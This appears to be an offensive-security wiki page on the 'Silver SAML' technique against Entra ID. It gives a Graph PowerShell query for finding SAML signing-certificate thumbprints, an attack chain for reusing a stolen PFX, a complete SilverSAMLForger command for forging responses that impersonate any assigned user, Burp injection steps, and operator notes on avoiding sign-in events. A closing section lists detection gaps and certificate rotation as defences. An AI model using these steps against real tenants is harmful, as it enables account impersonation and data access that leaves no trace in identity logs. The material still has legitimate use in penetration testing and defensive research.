## Overview

Silver SAML abuses the trust model of SAML SSO integrations with Entra ID. When an application uses SAML SSO, Entra ID signs each authentication response with a certificate registered on the Service Principal. The application verifies the signature against the public key — but does not validate the response with Entra ID in real time.

If the attacker obtains the SAML signing certificate with its private key (PFX), they can forge a complete SAML response with any `NameID` — impersonating any user assigned to the application. The application's signature check passes because the key is legitimate. No sign-in event for the impersonated user appears in Entra ID.

## Preconditions

| Requirement | Detail |
|---|---|
| SAML signing certificate (PFX + private key) | Must match the `PreferredTokenSigningKeyThumbprint` on the target SP |
| PFX password (if encrypted) | Required to import and use the private key |
| Target application SAML parameters | EntityID, ACS URL — obtainable via Graph or Entra ID portal |
| Target user assigned to the app | NameID to impersonate must have a valid assignment on the SP |

## Certificate Discovery

The signing certificate thumbprint is visible on any Service Principal with SAML SSO configured:

```powershell
# Enumerate SAML SSO applications in the tenant
$params = @{
    Method  = "GET"
    Uri     = "https://graph.microsoft.com/v1.0/servicePrincipals?`$filter=preferredSingleSignOnMode eq 'saml'&`$select=displayName,appId,preferredTokenSigningKeyThumbprint"
    Headers = @{ Authorization = "Bearer $Graph" }
}
(Invoke-RestMethod @params).value | Format-Table displayName, preferredTokenSigningKeyThumbprint
```

Once the thumbprint is known, match it against any PFX material recovered from Key Vault, Storage, or other data plane sources.

## Attack Chain

```
Recover PFX  →  from Key Vault (getSecret), Storage ABAC bypass, or other source
              ↓
Verify match  →  cert thumbprint == SP.PreferredTokenSigningKeyThumbprint
              ↓
Collect params →  ACS URL + EntityID from Entra portal or Graph
               ↓
Forge response →  SilverSAMLForger with PFX + target NameID + app parameters
               ↓
Inject via     →  Burp Suite — replace SAMLResponse in POST to ACS endpoint
               ↓
Result         →  Session as impersonated user — no Entra ID sign-in event generated
```

## Forging the Response (SilverSAMLForger)

```powershell
SilverSAMLForger.exe generate `
    --pfxPath       "C:\path\to\cert.pfx" `
    --pfxPassword   "<pfx-password>" `
    --idpid         "https://sts.windows.net/<TENANT_ID>/" `
    --recipient     "https://<app-domain>/sso/saml" `
    --subjectnameid "<target-user@tenant.com>" `
    --audience      "https://<app-domain>/sso/saml" `
    --attributes    "...claims..."
```

Inject the Base64 output by replacing the `SAMLResponse` parameter in a POST to the ACS URL, captured via Burp Suite during a legitimate login attempt.

## Operator Notes

- The attack does not require any interaction from the target user after the certificate is obtained.
- The signing certificate on a Service Principal is often long-lived and rarely rotated. Check `NotAfter` on the PFX before proceeding.
- Multiple applications may share a signing certificate on the same tenant — one PFX may unlock impersonation in several apps.
- The `NameID` must be a user actually assigned to the application. Assigning a user to a SAML SP requires `Application Administrator` or higher — map assigned principals via Graph during recon.
- After the forged session is established, operate as the impersonated user from that application context.

## Detection / Friction Points

- **No sign-in event** in Entra ID for the impersonated user — the IdP never saw the authentication request for that identity.
- Application-side logs show activity by the impersonated user without a corresponding Entra ID login event — this gap is detectable if both log sources are correlated.
- The forged SAML response has timestamps — applications that validate `NotOnOrAfter` strictly will reject stale assertions. Generate fresh.
- Certificate rotation on the SP closes the attack path immediately. Post-compromise persistence requires re-obtaining the new certificate.
